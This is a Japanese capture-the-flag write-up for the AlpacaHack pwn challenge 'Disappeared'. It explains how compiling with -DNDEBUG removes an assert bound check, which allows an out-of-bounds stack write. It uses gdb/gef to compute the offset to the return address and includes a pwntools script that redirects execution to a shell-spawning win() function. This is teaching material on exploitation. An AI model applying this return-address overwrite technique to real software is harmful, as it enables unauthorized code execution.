# ■ Disappeared
[Disappeared - AlpacaHack](https://alpacahack.com/challenges/disappeared)

# 1. Writeup
## 1.0. `main.c`

`main.c`:
```C
 1	// gcc -DNDEBUG -o chal main.c -no-pie
...
 7	void win() {
 8	    execve("/bin/sh", NULL, NULL);
 9	}
10	
11	void safe() {
12	    unsigned num[100], pos;
13	    printf("pos > ");
14	    scanf("%u", &pos);
15	    assert(pos<100);
16	    printf("val > ");
17	    scanf("%u", &num[pos]);
18	}
...
```

## 1.1. `-DNDEBUG`
コンパイルオプション `-DNDEBUG` はコンパイル時に `assert` マクロなどのデバッグ機能を無効化する. よって

```C
15	    assert(pos<100);
```

による `pos` の閾値チェックがなくなるので, 

```C
17	    scanf("%u", &num[pos]);
```

で `num` の配列外参照と書き込みが可能.

## 1.2. `num` から `safe` リターンアドレスまでのoffset
`num` への配列外書き込みで `safe` リターンアドレスを `win` アドレスに書き換えたい.

`num` から `safe` リターンアドレスまでのoffsetを求める必要がある.

```bash
$ gdb ./chal
(gdb) disassemble safe
Dump of assembler code for function safe:
...
   0x0000000000401225 <+75>:    call   0x4010c0 <__isoc99_scanf@plt>
...
   0x0000000000401266 <+140>:   call   0x4010c0 <__isoc99_scanf@plt>
   0x000000000040126b <+145>:   nop
...
(gdb) disassemble main
Dump of assembler code for function main:
...
   0x00000000004012cb <+73>:    call   0x4011da <safe>
   0x00000000004012d0 <+78>:    mov    $0x0,%eax
...
```

`pos` に `0`, `val`(`num[pos=0]`) に任意のパターンを入れ, パターンからリターンアドレス(`0x4012d5 <main+73>`)へのoffsetを求められる.

手順例:
1. `<safe+145>`(2回目の `scanf` のあと)にbreakpointを張る.
2. `pos` に `0` を入力.
3. `val`(`num[0]`) に `3735928559(0xdeadbeef)` を入力.
4. breakpointに止まるので, `0xdeadbeef` があるアドレスから `0x4012d5 <main+73>` へのoffsetを計算する.
```bash
gef➤  r
...
pos > 0
val > 3735928559
gef➤  search-pattern 0xdeadbeef
[+] Searching '\xef\xbe\xad\xde' in memory
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffdbb0 - 0x7fffffffdbc0  →   "\xef\xbe\xad\xde[...]"
gef➤  search-pattern 0x4012d0
[+] Searching '\xd0\x12\x40' in memory
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffdd58 - 0x7fffffffdd64  →   "\xd0\x12\x40[...]"
```

```bash
gef➤  x/60gx $rsp
0x7fffffffdba0: 0x0000000000000019      0x0000000000080000
0x7fffffffdbb0: 0x00000000deadbeef      0x0000000000000040
...
0x7fffffffdd50: 0x00007fffffffdd60      0x00000000004012d0 <- retaddr
0x7fffffffdd60: 0x00007fffffffde10      0x00007ffff7c27781
0x7fffffffdd70: 0x00007ffff7fe0ce0      0x00007fffffffde98
```

```bash
gef➤  p/u (0x7fffffffdd58 - 0x7fffffffdbb0)/4
$6 = 106
```
> [!note]
> 4で割っているのは, `num` の型 `unsigned` が4byteであり, 1要素あたりのoffsetに変換するため.

## 1.3. 回答
`num` から `safe` リターンアドレスまでのoffsetがわかったので, `num[106]`(=`safe`retaddr)に `win` アドレスを入れることで `safe` からのリターン時に `win` をcallできる.

`solve.py`:
```python
from pwn import *

_, HOST, PORT = 'nc localhost 9999'.split()
io = remote(HOST, PORT)

elf = ELF('./chal')
win_addr = elf.sym['win']

io.sendlineafter(b'pos > ', b'106')
io.sendlineafter(b'val > ', str(win_addr).encode())

io.interactive()
```

実行例:
```bash
$ python ./solve.py
...
$ id
uid=999(pwn) gid=999(pwn) groups=999(pwn)
$ cat flag.txt
Alpaca{REDACTED}
```
